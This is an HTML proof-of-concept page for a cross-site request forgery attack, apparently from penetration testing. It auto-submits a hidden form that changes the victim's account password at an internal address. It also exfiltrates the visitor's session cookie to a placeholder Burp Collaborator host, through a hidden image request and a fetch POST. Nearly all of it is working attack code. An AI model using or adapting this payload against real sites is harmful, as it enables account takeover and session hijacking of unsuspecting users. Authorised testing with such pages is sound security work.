<!DOCTYPE html>
<html>
<head>
    <title>CSRF Test - Account Password Update</title>
</head>
<body>
    <h1>CSRF PoC - Change Account Password</h1>
    <p>This form will attempt to change your account password to "csrfhacked123" and capture your session cookie.</p>

    <!-- Hidden image to exfiltrate cookie via Burp Collaborator -->
    <img id="cookieImg" style="display:none;" onerror="console.log('Cookie sent via img')">

    <script>
        // Set img src dynamically to include cookie
        document.getElementById('cookieImg').src = 'https://[BURP_COLLABORATOR_URL]?cookie=' + encodeURIComponent(document.cookie);
    </script>

    <!-- CSRF Form - Account Password Update -->
    <form action="http://10.0.0.10/account/update" method="POST" id="csrfForm">
        <input type="hidden" name="password" value="csrfhacked123">
        <input type="hidden" name="updatedPassword" value="csrfhacked123">
        <input type="hidden" name="updateField" value="account">
        <button type="submit">Test CSRF - Change Password</button>
    </form>

    <script>
        // Exfiltrate cookie using fetch to Burp Collaborator
        fetch('https://[BURP_COLLABORATOR_URL]', {
            method: 'POST',
            body: 'cookie=' + encodeURIComponent(document.cookie),
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded'
            }
        }).catch(err => console.log('Cookie exfiltration attempt'));

        // Optional: Auto-submit the form after cookie exfiltration
        setTimeout(() => {
            document.getElementById('csrfForm').submit();
        }, 1000);
    </script>
</body>
</html>
